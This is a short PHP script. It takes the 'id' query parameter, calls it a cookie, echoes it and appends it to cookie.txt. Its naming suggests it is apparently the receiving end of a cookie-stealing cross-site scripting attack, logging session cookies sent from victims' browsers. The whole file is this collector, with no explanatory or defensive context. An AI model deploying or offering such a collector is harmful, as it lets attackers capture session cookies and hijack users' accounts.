<?php 
$cookie = $_GET['id']; 
var_dump($cookie); 
$myFile = "cookie.txt"; 
file_put_contents($myFile, $cookie); 
?> 